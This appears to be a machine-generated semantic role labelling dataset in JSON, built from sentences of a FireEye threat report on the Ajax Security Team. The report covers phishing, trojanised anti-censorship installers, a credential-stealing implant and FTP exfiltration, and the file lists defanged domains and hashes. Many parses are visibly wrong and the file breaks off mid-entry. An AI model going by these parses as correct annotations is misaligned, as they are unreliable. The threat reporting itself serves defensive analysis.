{"text": "is", "index": 71}, "ARGM-ADV": {"text": "actually"}, "ARG2": {"text": "malware"}}}, " This implant, in turn,\ndrops various other components into C:\\                      \nDocuments and Settings\\{USER}\\Application\nData\\IntelRapidStart\\": {"drops": {"ARG0": {"text": "This implant"}, "ARGM-DIS": {"text": "in turn"}, "V": {"text": "drops", "index": 6}, "ARG1": {"text": "various other components"}, "ARG4": {"text": "into C:\\ Documents"}}}, "                      \n                                                      \nThe first cluster contains the domain used in the     \nAerospace Conference attack as well as the            \ndomains used in phishing attacks designed to          \ncapture user credentials:                             \n                                                      \nThe website used in the Aerospace Conference\nattack was aeroconf2014[.]org, which is registered\nto info@usa.gov[.]us": {"contains": {"ARG0": {"text": "The first cluster"}, "V": {"text": "contains", "index": 3}, "ARG1": {"text": "the domain used in the Aerospace Conference attack as well as the domains used in phishing attacks designed to capture user credentials"}}, "used": {"ARG1": {"text": "the domain"}, "V": {"text": "used", "index": 6}, "ARG2": {"text": "in the Aerospace Conference attack"}}, "used_2": {"ARG1": {"text": "the domains"}, "V": {"text": "used", "index": 17}, "ARG2": {"text": "in phishing attacks"}}, "phishing": {"V": {"text": "phishing", "index": 19}, "ARG1": {"text": "attacks"}}, "designed": {"ARG1": {"text": "the domains used in phishing attacks"}, "V": {"text": "designed", "index": 21}, "ARG3": {"text": "to capture user credentials"}}, "capture": {"V": {"text": "capture", "index": 23}, "ARG1": {"text": "user credentials"}}, "used_3": {"ARG1": {"text": "The website"}, "V": {"text": "used", "index": 29}, "ARGM-LOC": {"text": "in the Aerospace Conference attack"}}, "was": {"ARG1": {"text": "The website used in the Aerospace Conference attack"}, "V": {"text": "was", "index": 35}, "ARG2": {"text": "aeroconf2014[.]org , which is registered to info@usa.gov[.]us"}}, "is": {"V": {"text": "is", "index": 39}}, "registered": {"ARG1": {"text": "aeroconf2014[.]org"}, "R-ARG1": {"text": "which"}, "V": {"text": "registered", "index": 40}, "ARG2": {"text": "to info@usa.gov[.]us"}}}, " We also observed crossover\nwith a sample that connected to both intel-\nupdate[.]com and ultrasms[.]ir, which was\nregistered by lvlr98@gmail[.]com": {"observed": {"ARG0": {"text": "We"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "observed", "index": 2}, "ARG1": {"text": "crossover with a sample that connected to both intel- update[.]com and ultrasms[.]ir , which was registered by lvlr98@gmail[.]com"}}, "connected": {"ARG1": {"text": "a sample"}, "R-ARG1": {"text": "that"}, "V": {"text": "connected", "index": 8}, "ARG2": {"text": "to both intel- update[.]com and ultrasms[.]ir"}}, "was": {"V": {"text": "was", "index": 17}}, "registered": {"ARG1": {"text": "both and ultrasms[.]ir"}, "R-ARG1": {"text": "which"}, "V": {"text": "registered", "index": 18}, "ARG0": {"text": "by lvlr98@gmail[.]com"}}}, "                            \n</section>\n\n<section>                                                        \n<heading>Victimology</heading>                                             \nDuring our investigation, we were able to recover       \ninformation on 77 victims from one CnC server           \nthat we discovered while analyzing malware              \nsamples that were disguised as anti-censorship          \ntools": {"were": {"ARGM-TMP": {"text": "During our investigation"}, "ARG1": {"text": "we"}, "V": {"text": "were", "index": 5}, "ARG2": {"text": "able to recover information on 77 victims from one CnC server that we discovered while analyzing malware samples that were disguised as anti - censorship tools"}}, "recover": {"ARG0": {"text": "we"}, "V": {"text": "recover", "index": 8}, "ARG1": {"text": "information"}, "ARGM-LOC": {"text": "on 77 victims from one CnC server"}, "C-ARG1": {"text": "that we discovered"}, "ARGM-TMP": {"text": "while analyzing malware samples that were disguised as anti - censorship tools"}}, "discovered": {"ARG1": {"text": "77 victims from one CnC server"}, "R-ARG1": {"text": "that"}, "ARG0": {"text": "we"}, "V": {"text": "discovered", "index": 19}, "ARGM-TMP": {"text": "while analyzing malware samples that were disguised as anti - censorship tools"}}, "analyzing": {"ARG0": {"text": "we"}, "V": {"text": "analyzing", "index": 21}, "ARG1": {"text": "malware samples that were disguised as anti - censorship tools"}}, "were_2": {"ARG1": {"text": "malware samples"}, "R-ARG1": {"text": "that"}, "V": {"text": "were", "index": 25}, "ARG2": {"text": "disguised as anti - censorship tools"}}, "disguised": {"ARG1": {"text": "malware samples"}, "R-ARG1": {"text": "that"}, "V": {"text": "disguised", "index": 26}, "ARG2": {"text": "as anti - censorship tools"}}}, "                      \n                                                                  \nHarvested data is encrypted and written to disk on                \nthe local host": {"Harvested": {"V": {"text": "Harvested", "index": 0}, "ARG1": {"text": "data"}}, "is": {"ARG1": {"text": "Harvested"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "encrypted"}}, "encrypted": {"ARG1": {"text": "Harvested data"}, "V": {"text": "encrypted", "index": 3}, "ARGM-LOC": {"text": "on the local host"}}, "written": {"ARGM-DIS": {"text": "Harvested"}, "ARG1": {"text": "data"}, "V": {"text": "written", "index": 5}, "ARG2": {"text": "to disk"}, "ARGM-LOC": {"text": "on the local host"}}, "disk": {"V": {"text": "disk", "index": 7}, "ARGM-LOC": {"text": "on the local host"}}}, " We have seen this group                                     \nleverage varied social engineering tactics as a                                 \nmeans to lure their targets into infecting                                      \nthemselves with malware": {"have": {"V": {"text": "have", "index": 1}}, "seen": {"ARG0": {"text": "We"}, "V": {"text": "seen", "index": 2}, "ARG1": {"text": "this group leverage varied social engineering tactics"}, "ARG2": {"text": "as a means to lure their targets into infecting themselves with malware"}}, "varied": {"ARG0": {"text": "this group leverage"}, "V": {"text": "varied", "index": 6}, "ARG1": {"text": "social engineering tactics"}}, "lure": {"V": {"text": "lure", "index": 14}, "ARG1": {"text": "their targets"}, "ARG2": {"text": "into infecting themselves with malware"}}, "infecting": {"V": {"text": "infecting", "index": 18}, "ARG1": {"text": "themselves"}, "ARG2": {"text": "with malware"}}}, " This sample      \n                                                      \n(MD5 1823b77b9ee6296a8b997ffb64d32d21)                \nwas configured to exfiltrate data to ultrasms[.]ir": {"was": {"ARG1": {"text": "This sample ( MD5 1823b77b9ee6296a8b997ffb64d32d21 )"}, "V": {"text": "was", "index": 6}, "ARG2": {"text": "configured to exfiltrate data to ultrasms[.]ir"}}, "configured": {"ARG1": {"text": "This sample ( MD5 1823b77b9ee6296a8b997ffb64d32d21 )"}, "V": {"text": "configured", "index": 7}, "ARG4": {"text": "to exfiltrate data to ultrasms[.]ir"}}, "exfiltrate": {"V": {"text": "exfiltrate", "index": 9}, "ARG1": {"text": "data"}, "ARGM-PNC": {"text": "to ultrasms[.]ir"}}}, "\n  dll creates sqlite3.dll and\n  global atom\n</caption>\n\n<figure></figure>\n\n<caption>\n  Figure 5: IntelRS.exe sleeps\n  until global atom is set and\n  sqlite3.dll is present\n</caption>\n\n<figure></figure>\n\n\n<footer>7 www.fireeye.com</footer>\n\f\n<header>Fireeye: Operation Saffron Rose 2013</header>\n\n\n\n\nThe Stealer component uses common techniques                      \nto acquire credential data": {"creates": {"ARG0": {"text": "dll"}, "V": {"text": "creates", "index": 1}, "ARG1": {"text": "sqlite3.dll and global atom The Stealer component uses common techniques to acquire credential data"}}, "uses": {"ARG0": {"text": "The Stealer component"}, "V": {"text": "uses", "index": 9}, "ARG1": {"text": "common techniques"}, "ARG2": {"text": "to acquire credential data"}}, "acquire": {"V": {"text": "acquire", "index": 13}, "ARG1": {"text": "credential data"}}}, "\n\n\u2022       288c91d6c0197e99b92c06496921bf2f was\n        bundled with an installer for Proxifier\n        software": {"was": {"ARG1": {"text": "\u2022 288c91d6c0197e99b92c06496921bf2f"}, "V": {"text": "was", "index": 2}, "ARG2": {"text": "bundled with an installer for Proxifier software"}}, "bundled": {"ARGM-PRD": {"text": "\u2022 288c91d6c0197e99b92c06496921bf2f"}, "V": {"text": "bundled", "index": 3}, "ARG2": {"text": "with an installer for Proxifier software"}}}, " In\nyears past, Iranian actors primarily committed politically-motivated website defacement\nand DDoS attacks.<fn>1</fn> More recently, however, suspected Iranian actors have destroyed data\non thousands of computers with the Shamoon virus,<fn>2</fn> and they have penetrated the Navy\nMarine Corps Intranet (NMCI), which is used by the U.S": {"committed": {"ARGM-TMP": {"text": "In years past"}, "ARG0": {"text": "Iranian actors"}, "ARGM-ADV": {"text": "primarily"}, "V": {"text": "committed", "index": 7}, "ARG1": {"text": "politically - motivated website defacement and DDoS attacks"}}, "have": {"V": {"text": "have", "index": 19}}, "penetrated": {"ARG0": {"text": "they"}, "V": {"text": "penetrated", "index": 20}, "ARG1": {"text": "the Navy Marine Corps Intranet ( NMCI ) , which is used by the U.S"}}, "is": {"V": {"text": "is", "index": 31}}, "used": {"ARG1": {"text": "the Navy Marine Corps Intranet ( NMCI )"}, "R-ARG1": {"text": "which"}, "V": {"text": "used", "index": 32}, "ARG0": {"text": "by the U.S"}}}, " Examples\ninclude:\n\n\u2022       6dc7cc33a3cdcfee6c4edb6c085b869d was\n        bundled with an installer for Ultrasurf Proxy\n        software": {"include": {"ARG2": {"text": "Examples"}, "V": {"text": "include", "index": 1}, "ARG1": {"text": "\u2022 6dc7cc33a3cdcfee6c4edb6c085b869d was bundled with an installer for Ultrasurf Proxy software"}}, "was": {"ARG1": {"text": "\u2022 6dc7cc33a3cdcfee6c4edb6c085b869d"}, "V": {"text": "was", "index": 5}, "ARG2": {"text": "bundled with an installer"}, "ARGM-GOL": {"text": "for Ultrasurf Proxy software"}}, "bundled": {"ARG1": {"text": "\u2022 6dc7cc33a3cdcfee6c4edb6c085b869d"}, "V": {"text": "bundled", "index": 6}, "ARG2": {"text": "with an installer for Ultrasurf Proxy software"}}}, "\n</footnote>\n\n\n\n<footer>4 www.fireeye.com</footer>\n\f\n<header>Fireeye: Operation Saffron Rose 2013</header>\n\n\n\n<section>\n<heading>Credential Phishing</heading>                                                         \nThe attackers have also used phishing attacks, in                           \nwhich they set up Web pages to emulate various                              \nservices that require security credentials": {"have": {"V": {"text": "have", "index": 2}}, "used": {"ARG0": {"text": "The attackers"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "used", "index": 4}, "ARG1": {"text": "phishing attacks , in which they set up Web pages to emulate various services that require security credentials"}}, "phishing": {"V": {"text": "phishing", "index": 5}, "ARG1": {"text": "attacks"}}, "set": {"ARGM-LOC": {"text": "in which"}, "ARG0": {"text": "they"}, "V": {"text": "set", "index": 11}, "ARG1": {"text": "Web pages"}, "ARGM-PRP": {"text": "to emulate various services that require security credentials"}}, "emulate": {"ARG0": {"text": "they"}, "V": {"text": "emulate", "index": 16}, "ARG1": {"text": "various services that require security credentials"}}, "require": {"ARG0": {"text": "various services"}, "R-ARG0": {"text": "that"}, "V": {"text": "require", "index": 20}, "ARG1": {"text": "security credentials"}}}, " The user can\n configure the new backdoor to connect to a\n specific CnC server with a personalized username\n and password": {"can": {"V": {"text": "can", "index": 2}}, "configure": {"ARG0": {"text": "The user"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "configure", "index": 3}, "ARG1": {"text": "the new backdoor"}, "ARGM-PRP": {"text": "to connect to a specific CnC server with a personalized username and password"}}, "connect": {"ARG0": {"text": "The user"}, "V": {"text": "connect", "index": 8}, "ARG1": {"text": "to a specific CnC server with a personalized username and password"}}}, "\n\nTo counter anti-censorship efforts, Iran has\nattempted to block the use of certain software\ntools.<fn>19</fn> In 2012, researchers found that an\nanti-censorship tool that is primarily used by\nInternet users in Iran was bundled with malware\nand redistributed.<fn>20</fn>\n\nOur investigation found that malware-laden\nversions of legitimate anti-censorship software,\nsuch as Psiphon and Ultrasurf, were distributed to\nusers Iran and Persian speaking people around the\nworld": {"counter": {"V": {"text": "counter", "index": 1}, "ARG1": {"text": "anti - censorship efforts"}, "ARG0": {"text": "Iran/ Our investigation"}}, "has": {"V": {"text": "has", "index": 8}}, "attempted": {"R-ARG0": {"text": "To counter anti - censorship efforts"}, "ARG0": {"text": "Iran"}, "V": {"text": "attempted", "index": 9}, "ARG1": {"text": "to block the use of certain software tools"}}, "block": {"ARG0": {"text": "Iran"}, "V": {"text": "block", "index": 11}, "ARG1": {"text": "the use of certain software tools"}}, "found": {"ARG0": {"text": "Our investigation"}, "V": {"text": "found", "index": 21}, "ARG1": {"text": "that malware - laden versions of legitimate anti - censorship software , such as Psiphon and Ultrasurf , were distributed to users Iran and Persian speaking people around the world"}}, "were": {"V": {"text": "were", "index": 40}}, "distributed": {"ARG1": {"text": "malware - laden versions of legitimate anti - censorship software , such as Psiphon and Ultrasurf ,"}, "V": {"text": "distributed", "index": 41}, "ARG2": {"text": "to users Iran and Persian speaking people around the world"}}, "speaking": {"ARG0": {"text": "users Iran and Persian"}, "V": {"text": "speaking", "index": 47}, "ARG1": {"text": "people"}, "ARGM-LOC": {"text": "around the world"}}}, " This\nwas also the email address used to register the\ndomain aerospace2014[.]org, which was used in\nspear phishing attacks against companies in the\nU.S": {"was": {"ARG1": {"text": "This"}, "V": {"text": "was", "index": 1}, "ARGM-ADV": {"text": "also"}, "ARG2": {"text": "the email address used to register the domain aerospace2014[.]org , which was used in spear phishing attacks against companies in the U.S"}}, "used": {"V": {"text": "used", "index": 6}}, "register": {"ARG0": {"text": "the email address"}, "V": {"text": "register", "index": 8}, "ARG1": {"text": "the domain aerospace2014[.]org , which was used in spear phishing attacks against companies in the U.S"}}, "was_2": {"V": {"text": "was", "index": 14}}, "used_2": {"ARG1": {"text": "the domain aerospace2014[.]org"}, "R-ARG1": {"text": "which"}, "V": {"text": "used", "index": 15}, "ARG2": {"text": "in spear phishing attacks against companies in the U.S"}}, "phishing": {"V": {"text": "phishing", "index": 18}, "ARG1": {"text": "attacks"}}}, " There is code to         \nexfiltrate data over HTTP POST as well, but it is       \nunused": {"is": {"V": {"text": "is", "index": 1}, "ARG1": {"text": "code to exfiltrate data over HTTP POST"}, "ARGM-DIS": {"text": "as well"}}, "exfiltrate": {"V": {"text": "exfiltrate", "index": 4}, "ARG1": {"text": "data over HTTP POST"}, "ARGM-DIS": {"text": "as well"}}, "is_2": {"ARG1": {"text": "it"}, "V": {"text": "is", "index": 14}, "ARG2": {"text": "unused"}}}, " The executable is a CAB extractor that            \ndrops the implant IntelRS.exe": {"is": {"ARG1": {"text": "The executable"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "a CAB extractor that drops the implant IntelRS.exe"}}, "drops": {"ARG0": {"text": "a CAB extractor"}, "R-ARG0": {"text": "that"}, "V": {"text": "drops", "index": 7}, "ARG1": {"text": "the implant IntelRS.exe"}}}, "\n\n\u2022       3efd971db6fbae08e96535478888cff9 was\n        bundled with an installer for the Psiphon\n        proxy": {"was": {"ARG1": {"text": "\u2022 3efd971db6fbae08e96535478888cff9"}, "V": {"text": "was", "index": 2}, "ARG2": {"text": "bundled with an installer"}, "ARGM-GOL": {"text": "for the Psiphon proxy"}}, "bundled": {"ARG1": {"text": "\u2022 3efd971db6fbae08e96535478888cff9"}, "V": {"text": "bundled", "index": 3}, "ARG2": {"text": "with an installer"}, "ARGM-GOL": {"text": "for the Psiphon proxy"}}}, " For instance, it loads                \nvaultcli.DLL and uses various APIs shown below to                 \nacquire RDP accounts from the Windows vault": {"loads": {"ARGM-DIS": {"text": "For instance"}, "ARG0": {"text": "it"}, "V": {"text": "loads", "index": 4}, "ARG1": {"text": "vaultcli . DLL"}}, "uses": {"ARGM-DIS": {"text": "For instance"}, "ARG0": {"text": "it"}, "V": {"text": "uses", "index": 9}, "ARG1": {"text": "various APIs shown below"}, "ARG2": {"text": "to acquire RDP accounts from the Windows vault"}}, "shown": {"ARGM-DIS": {"text": "For instance"}, "V": {"text": "shown", "index": 12}, "ARGM-LOC": {"text": "below"}, "ARG1": {"text": "to acquire RDP accounts from the Windows vault"}}, "acquire": {"V": {"text": "acquire", "index": 15}, "ARG1": {"text": "RDP accounts"}, "ARG2": {"text": "from the Windows vault"}}}, " The attacker can bind the backdoor\n to a legitimate application of his or her choosing, or\n they can cloak it with an icon designed to make the\n backdoor appear as though it is a legitimate file": {"can": {"V": {"text": "can", "index": 2}}, "bind": {"ARG0": {"text": "The attacker"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "bind", "index": 3}, "ARG3": {"text": "the backdoor/ of his or her choosing"}, "ARG2": {"text": "to a legitimate application"}}, "can_2": {"V": {"text": "can", "index": 18}}, "cloak": {"ARG0": {"text": "they"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "cloak", "index": 19}, "ARG1": {"text": "it"}, "ARG2": {"text": "with an icon designed to make the backdoor appear as though it is a legitimate file"}}, "designed": {"ARG1": {"text": "an icon"}, "V": {"text": "designed", "index": 24}, "ARG3": {"text": "to make the backdoor appear as though it is a legitimate file"}}, "make": {"V": {"text": "make", "index": 26}, "ARG1": {"text": "the backdoor appear as though it"}}, "appear": {"ARG1": {"text": "the backdoor"}, "V": {"text": "appear", "index": 29}, "ARGM-MNR": {"text": "as though it is a legitimate file"}}, "is": {"ARG1": {"text": "it"}, "V": {"text": "is", "index": 33}, "ARG2": {"text": "a legitimate file"}}}, "                \n                                                             \n Upon executing the \u2018Stealer Builder\u2019 the user is            \n presented with an option to load the \u2018Builder\u2019 or to        \n \u2018Decrypt\u2019 logs generated from a victim and                  \n exfiltrated to a command-and-control (CnC) server           \n under the groups\u2019 control": {"executing": {"V": {"text": "executing", "index": 1}, "ARG1": {"text": "the \u2018 Stealer Builder \u2019"}, "ARG0": {"text": "the user"}}, "is": {"V": {"text": "is", "index": 9}}, "presented": {"ARGM-TMP": {"text": "Upon executing the \u2018 Stealer Builder \u2019"}, "ARG2": {"text": "the user"}, "V": {"text": "presented", "index": 10}, "ARG3": {"text": "with an option to load the \u2018 Builder \u2019 or to \u2018 Decrypt \u2019 logs generated from a victim and exfiltrated to a command - and - control ( CnC ) server under the groups \u2019 control"}}, "load": {"V": {"text": "load", "index": 15}, "ARG2": {"text": "the \u2018 Builder \u2019"}}, "\u2018": {"V": {"text": "\u2018", "index": 22}, "ARG1": {"text": "Decrypt \u2019 logs generated"}}, "generated": {"ARG1": {"text": "to/ \u2018 Decrypt \u2019 logs"}, "V": {"text": "generated", "index": 26}, "ARG3": {"text": "from a victim"}}, "exfiltrated": {"V": {"text": "exfiltrated", "index": 31}, "ARG2": {"text": "to a command - and - control ( CnC ) server"}, "ARGM-LOC": {"text": "under the groups \u2019 control"}}}, "   \n\n\u2022\t    Performs key logging                            \n\n\u2022       Takes various screenshots\n\n\u2022       Harvests instant messaging (IM) account\n        information: GTalk, Pidgin, Yahoo, Skype\n\n\u2022       Tracks credentials, bookmarks and history\n        from major browsers: Chrome, Firefox, Opera\n\n\u2022       Collects email account information\n\n\u2022       Extracts installed proxy software\n        configuration information\n\n\u2022       Harvests data from installed cookies\n</list>\nIntelRS.exe loads a Delphi component called\nDelphiNative.DLL, which implements some\nadditional data theft functionality for the following:\n<list>\n\u2022       Internet Explorer (IE) accounts\n\n\u2022       Remote Desktop Protocol (RDP) accounts\n\n\u2022       Browser URLs\n</list>\n\n<caption>\n  Figure 4: AppTransferWizard": {"Performs": {"ARG0": {"text": "\u2022"}, "V": {"text": "Performs", "index": 1}, "ARG1": {"text": "key logging \u2022"}}, "Takes": {"ARG0": {"text": "\u2022 Performs key logging \u2022"}, "V": {"text": "Takes", "index": 5}, "ARG1": {"text": "various screenshots \u2022 Harvests instant messaging ( IM ) account information"}}, "installed": {"ARG0": {"text": "Chrome , Firefox , Opera \u2022 Collects email account information \u2022 Extracts"}, "V": {"text": "installed", "index": 48}, "ARG1": {"text": "proxy software configuration information \u2022 Harvests data"}, "ARG2": {"text": "from installed cookies Figure 4"}}, "installed_2": {"V": {"text": "installed", "index": 57}, "ARG1": {"text": "cookies Figure 4"}}}, " As such,\nwe believe that attackers disguised malware as\nanti-censorship tools in order to target the users of\nsuch tools inside Iran as well as Iranian dissidents\noutside the country": {"believe": {"ARGM-ADV": {"text": "As such"}, "ARG0": {"text": "we"}, "V": {"text": "believe", "index": 4}, "ARG1": {"text": "that attackers disguised malware as anti - censorship tools in order to target the users of such tools inside Iran as well as Iranian dissidents outside the country"}}, "disguised": {"ARG0": {"text": "attackers"}, "V": {"text": "disguised", "index": 7}, "ARG1": {"text": "malware"}, "ARG2": {"text": "as anti - censorship tools"}, "ARGM-PRP": {"text": "in order to target the users of such tools inside Iran as well as Iranian dissidents outside the country"}}, "target": {"V": {"text": "target", "index": 17}, "ARG1": {"text": "the users of such tools inside Iran as well as Iranian dissidents"}, "ARGM-LOC": {"text": "outside the country"}}}, "\n\n\n<caption>\n  Figure 3: StartBypass\n  Ordinal\n</caption>\n\n<figure></figure>\n\n<footer>6 www.fireeye.com</footer>\n\f\n<header>Fireeye: Operation Saffron Rose 2013</header>\n\n\n\n\nData exfiltration is conducted over FTP by              \nAppTransferWiz.dll, which acts as an FTP client": {"is": {"V": {"text": "is", "index": 2}}, "conducted": {"ARG1": {"text": "Data exfiltration"}, "V": {"text": "conducted", "index": 3}, "ARGM-MNR": {"text": "over FTP"}, "ARG0": {"text": "by AppTransferWiz.dll , which acts as an FTP client"}}, "acts": {"ARG0": {"text": "AppTransferWiz.dll"}, "R-ARG0": {"text": "which"}, "V": {"text": "acts", "index": 10}, "ARG1": {"text": "as an FTP client"}}}, "      \n\nOnce the state is set, IntelRS.exe proceeds to          \ncollect data from various areas in the system as        \ndescribed below:                                        \n<list>\n\u2022\t    Collects system information: hostname,          \n      username, timezone, IP addresses, open ports,\n      installed applications, running processes, etc": {"is": {"V": {"text": "is", "index": 3}}, "set": {"ARG1": {"text": "the state"}, "V": {"text": "set", "index": 4}}, "proceeds": {"ARGM-TMP": {"text": "Once the state is set"}, "ARG0": {"text": "IntelRS.exe"}, "V": {"text": "proceeds", "index": 7}, "ARG1": {"text": "to collect data from various areas in the system as described below : \u2022 Collects system information : hostname , username , timezone , IP addresses , open ports , installed applications , running processes , etc"}}, "collect": {"ARG0": {"text": "IntelRS.exe"}, "V": {"text": "collect", "index": 9}, "ARG1": {"text": "data from various areas in the system"}, "ARGM-MNR": {"text": "as described below"}}, "described": {"V": {"text": "described", "index": 18}, "ARGM-LOC": {"text": "below"}}, "installed": {"ARG0": {"text": "hostname , username , timezone"}, "V": {"text": "installed", "index": 38}, "ARG1": {"text": "applications"}}, "running": {"V": {"text": "running", "index": 41}, "ARG1": {"text": "processes"}}}, "\n\nFor example, the Ajax Security Team could just be\nusing anti-censorship tools as a lure because they\nare popular in Iran, in order to engage in activities\nthat would be considered traditional cybercrime": {"could": {"V": {"text": "could", "index": 7}}, "be": {"V": {"text": "be", "index": 9}}, "using": {"ARGM-DIS": {"text": "For example"}, "ARG0": {"text": "the Ajax Security Team"}, "ARGM-MOD": {"text": "could"}, "ARGM-ADV": {"text": "just"}, "V": {"text": "using", "index": 10}, "ARG1": {"text": "anti - censorship tools"}, "ARGM-MNR": {"text": "as a lure"}, "ARGM-CAU": {"text": "because they are popular in Iran"}, "ARGM-PRP": {"text": "in order to engage in activities that would be considered traditional cybercrime"}}, "are": {"ARG1": {"text": "they"}, "V": {"text": "are", "index": 20}, "ARG2": {"text": "popular"}, "ARGM-LOC": {"text": "in Iran"}, "ARGM-PRP": {"text": "in order to engage in activities that would be considered traditional cybercrime"}}, "engage": {"V": {"text": "engage", "index": 28}, "ARG2": {"text": "in activities that would be considered traditional cybercrime"}}, "would": {"V": {"text": "would", "index": 32}}, "be_2": {"V": {"text": "be", "index": 33}}, "considered": {"ARGM-MOD": {"text": "would"}, "V": {"text": "considered", "index": 34}, "ARG1": {"text": "traditional cybercrime"}}}, "                             \n                                                                            \nIf users attempt to login through these fake Web                            \npages, the attackers collect their login credentials": {"attempt": {"ARG0": {"text": "users"}, "V": {"text": "attempt", "index": 2}, "ARG1": {"text": "to login through these fake Web pages"}}, "login": {"V": {"text": "login", "index": 4}, "ARG1": {"text": "through these fake Web pages"}}, "collect": {"ARGM-ADV": {"text": "If users attempt to login through these fake Web pages"}, "ARG0": {"text": "the attackers"}, "V": {"text": "collect", "index": 13}, "ARG1": {"text": "their login credentials"}}}, "\nThese droppers contained icons used in the\nlegitimate installers for these programs": {"contained": {"ARG0": {"text": "These droppers"}, "V": {"text": "contained", "index": 2}, "ARG1": {"text": "icons used in the legitimate installers for these programs"}}, "used": {"ARG1": {"text": "icons"}, "V": {"text": "used", "index": 4}, "ARGM-LOC": {"text": "in the legitimate installers"}, "ARG2": {"text": "for these programs"}}}, "\n</footnote>\n\n<footer>3 www.fireeye.com</footer>\n\f\n<header>Fireeye: Operation Saffron Rose 2013</header>\n\n\n\n<section>\n<heading>Attack Vectors</heading>                                                                 \nWe have observed the Ajax Security Team use a                                  \nvariety of vectors to lure targets into installing                             \nmalicious software and/or revealing login                                      \ncredentials": {"have": {"V": {"text": "have", "index": 1}}, "observed": {"ARG0": {"text": "We"}, "V": {"text": "observed", "index": 2}, "ARG1": {"text": "the Ajax Security Team use a variety of vectors to lure targets into installing malicious software and/or revealing login credentials"}}, "use": {"ARG0": {"text": "the Ajax Security Team"}, "V": {"text": "use", "index": 7}, "ARG1": {"text": "a variety of vectors"}, "ARG2": {"text": "to lure targets into installing malicious software and/or revealing login credentials"}}, "lure": {"ARG0": {"text": "the Ajax Security Team"}, "V": {"text": "lure", "index": 13}, "ARG1": {"text": "targets"}, "ARG2": {"text": "into installing malicious software and/or"}}, "installing": {"V": {"text": "installing", "index": 16}, "ARG1": {"text": "malicious software and/or revealing login credentials"}}, "revealing": {"V": {"text": "revealing", "index": 20}, "ARG1": {"text": "login credentials"}}}, "   \nThe majority of the samples we analyzed connect       \nto intel-update[.]com and update-mirror[.]com,        \nwhich were registered by james.mateo@aim[.]com": {"analyzed": {"ARG1": {"text": "the samples"}, "ARG0": {"text": "we"}, "V": {"text": "analyzed", "index": 6}}, "intel": {"V": {"text": "intel", "index": 9}, "ARG1": {"text": "mirror[.]com , which were registered by james.mateo@aim[.]com"}}, "were": {"V": {"text": "were", "index": 18}}, "registered": {"ARG1": {"text": "intel - update[.]com and update - mirror[.]com"}, "R-ARG1": {"text": "which"}, "V": {"text": "registered", "index": 19}, "ARG0": {"text": "by james.mateo@aim[.]com"}}}, " These attack vectors include sending                              \nemail, private messages via social media, fake login\npages, and the propagation of anti-censorship                                  \nsoftware that has been infected with malware": {"include": {"ARG2": {"text": "These attack vectors"}, "V": {"text": "include", "index": 3}, "ARG1": {"text": "sending email , private messages via social media , fake login pages , and the propagation of anti - censorship software that has been infected with malware"}}, "sending": {"V": {"text": "sending", "index": 4}, "ARG1": {"text": "email"}}, "has": {"V": {"text": "has", "index": 26}}, "been": {"V": {"text": "been", "index": 27}}, "infected": {"ARG1": {"text": "anti - censorship software"}, "R-ARG1": {"text": "that"}, "V": {"text": "infected", "index": 28}, "ARG2": {"text": "with malware"}}}, " For example, the                                \nattackers targeted companies in the DIB using a                                \nfake conference page as a lure to trick targets into                           \ninstalling malicious software": {"targeted": {"ARG0": {"text": "the attackers"}, "V": {"text": "targeted", "index": 5}, "ARG1": {"text": "companies"}}, "using": {"ARGM-DIS": {"text": "For example"}, "ARG0": {"text": "attackers targeted companies in the DIB"}, "V": {"text": "using", "index": 10}, "ARG1": {"text": "a fake conference page"}, "ARGM-MNR": {"text": "as a lure"}, "ARG2": {"text": "to trick targets into installing malicious software"}}, "trick": {"V": {"text": "trick", "index": 19}, "ARG1": {"text": "targets"}, "ARG2": {"text": "into installing malicious software"}}, "installing": {"V": {"text": "installing", "index": 22}, "ARG1": {"text": "malicious software"}}}, " The following files are               \nwritten to disk in this location:                            \n\n\n<table>\n                File                                               Functionality\n  IntelRS.exe             Various stealer components and encryption implementation\n  DelphiNative.dll        Browser URL extraction, IE Accounts, RDP accounts (Imported by IntelRS.exe)\n\n\n\n  IntelRS.exe.config      Config containing supported .NET versions for IntelRS.exe\n\n\n  AppTransferWiz.dll      FTP exfiltration (Launched by IntelRS.exe)\n\n\n\n  RapidStartTech.stl      Base64 encoded config block containing FTP credentials, implant name, decoy name, screenshot\n                          interval and booleans for startup, keylogger and screenshot\n</table>\n\nThe IntelRS.exe is written in .NET and is aptly\nnamed \u201cStealer\u201d, as it has various data collection\nmodules": {"following": {"V": {"text": "following", "index": 1}, "ARG1": {"text": "files"}}, "are": {"V": {"text": "are", "index": 3}}, "written": {"ARG1": {"text": "The following files"}, "V": {"text": "written", "index": 4}, "ARGM-PRP": {"text": "to disk in this location"}}, "disk": {"ARG1": {"text": "The following files"}, "V": {"text": "disk", "index": 6}, "ARGM-LOC": {"text": "in this location"}}, "is": {"V": {"text": "is", "index": 13}}, "written_2": {"ARG1": {"text": "The IntelRS.exe"}, "V": {"text": "written", "index": 14}, "ARGM-LOC": {"text": "in .NET"}}, "is_2": {"V": {"text": "is", "index": 18}}, "named": {"ARG1": {"text": "The IntelRS.exe"}, "ARGM-MNR": {"text": "aptly"}, "V": {"text": "named", "index": 20}, "ARG2": {"text": "\u201c Stealer \u201d"}, "ARGM-CAU": {"text": "as it has various data collection modules"}}, "has": {"ARG0": {"text": "it"}, "V": {"text": "has", "index": 27}, "ARG1": {"text": "various data collection modules"}}}, "                                  \n</section>\n<section>\n<heading>Spear phishing</heading>                                                                 \nDuring our investigation, we discovered that these                             \nattackers sent targeted emails, as well as private\nmessages through social media": {"discovered": {"ARGM-TMP": {"text": "During our investigation"}, "ARG0": {"text": "we"}, "V": {"text": "discovered", "index": 5}, "ARG1": {"text": "that these attackers sent targeted emails , as well as private messages through social media"}}, "sent": {"ARG0": {"text": "these attackers"}, "V": {"text": "sent", "index": 9}, "ARG1": {"text": "targeted emails , as well as private messages"}, "ARGM-MNR": {"text": "through social media"}}, "targeted": {"V": {"text": "targeted", "index": 10}}}, "\n\n\u2022       3d26442f06b34df3d5921f89bf680ee9 was\n        bundled with an installer for Gerdoovpn\n        virtual private network software": {"was": {"ARG1": {"text": "\u2022 3d26442f06b34df3d5921f89bf680ee9"}, "V": {"text": "was", "index": 2}, "ARG2": {"text": "bundled with an installer for Gerdoovpn virtual private network software"}}, "bundled": {"ARG1": 